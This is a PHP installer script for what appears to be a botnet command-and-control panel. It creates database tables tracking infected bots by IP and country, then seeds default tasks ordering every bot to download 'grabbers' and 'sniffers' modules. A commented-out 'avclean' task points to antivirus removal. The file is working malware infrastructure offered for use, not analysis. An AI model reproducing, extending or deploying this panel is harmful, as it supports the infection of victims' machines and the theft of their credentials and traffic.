<?php

require("config.php");
require("includes/functions.php");
require("includes/mysql.php");

$db = new odbcClass();

$db -> query("CREATE TABLE `bots` ( `id` varchar(16) NOT NULL DEFAULT '0', `ip` varchar(15) NOT NULL DEFAULT '', `cc` varchar(10) NOT NULL, `first_time` int(11) NOT NULL, `last_time` int(11) NOT NULL, `system` int(1) NOT NULL, PRIMARY KEY (`id`)) ENGINE=MyISAM DEFAULT CHARSET=utf8;");

$db -> query("CREATE TABLE `ccTaskFilter` ( `taskId` int(11) NOT NULL, `cc` varchar(5) NOT NULL) ENGINE=MyISAM DEFAULT CHARSET=utf8;");

$db -> query("INSERT INTO `ccTaskFilter` VALUES(1, 'all');");

$db -> query("INSERT INTO `ccTaskFilter` VALUES(2, 'all');");

$db -> query("INSERT INTO `ccTaskFilter` VALUES(3, 'all');");

$db -> query("CREATE TABLE `finished` ( `botId` varchar(16) NOT NULL, `taskId` int(11) NOT NULL) ENGINE=MyISAM DEFAULT CHARSET=utf8;");

$db -> query("CREATE TABLE `gscounter` ( `option` varchar(255) NOT NULL, `value` varchar(255) NOT NULL, PRIMARY KEY (`option`)) ENGINE=MyISAM DEFAULT CHARSET=utf8;");

$db -> query("CREATE TABLE `tasks` ( `id` int(11) NOT NULL AUTO_INCREMENT, `bot` varchar(16) NOT NULL, `url` varchar(255) NOT NULL, `command` varchar(25) NOT NULL, `flags` varchar(10) NOT NULL, `functionName` varchar(50) NOT NULL, `limit` int(10) NOT NULL, `count` int(11) NOT NULL, `stop` set('0','1','-1') NOT NULL, PRIMARY KEY (`id`)) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;");

$db -> query("INSERT INTO `tasks` VALUES(1, 'all', '".WEB_ROOT."/load.php?module=grabbers', 'download', 'dpm', 'Work', 0, 0, '-1');");

// Функция пока недоступна
//$db -> query("INSERT INTO `tasks` VALUES(2, 'all', '".WEB_ROOT."/load.php?module=avclean', 'download', 'dpms', 'Work', 0, 0, '-1');");

$db -> query("INSERT INTO `tasks` VALUES(3, 'all', '".WEB_ROOT."/load.php?module=sniffers', 'download', 'dpms', 'Work', 0, 0, '-1');");

exit("<h1>Done!<br><a href='admin.php'>Admin panel</a></h1>");

?>